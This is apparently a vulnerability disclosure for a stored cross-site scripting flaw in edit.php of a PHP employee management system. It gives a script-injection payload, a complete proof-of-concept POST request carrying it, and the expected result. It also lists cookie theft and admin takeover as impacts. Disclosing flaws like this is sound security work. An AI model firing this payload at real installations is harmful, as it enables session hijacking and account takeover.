## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/edit.php` contains a Stored XSS vulnerability

Impact of the vulnerability
An attacker can inject malicious JavaScript into an employee record by submitting a crafted value in the update form. When an administrator later opens the affected employee’s edit page, the payload is rendered in an HTML attribute context and can execute, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the admin)
- Phishing/UI redress (injecting fake forms or modifying page content)

### Payload:

"><sCrIpT>alert(555)</sCrIpT>

```
"><sCrIpT>alert(555)</sCrIpT>
```

### POC:

The vulnerable endpoint is `POST /edit.php`. The application stores the submitted field value (e.g., `firstName`) and later reflects it into the edit form without HTML escaping.

POST /edit.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

firstName=%22%3E%3CsCrIpT%3Ealert%28555%29%3C%2FsCrIpT%3E&lastName=Hassan&email=mehadi%40xyz.corp&birthday=1997-08-13&gender=Male&contact=019192&nid=12121&address=Razarbag2h&dept=IT25&degree=Head525&id=101&update=

Expected result:

1. The POST request returns a success message (e.g., “Succesfully Updated”).
2. When visiting `GET /edit.php?id=101` afterwards, the injected script executes (e.g., a browser popup `alert(555)`), confirming stored XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409112826288](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409112826288.png)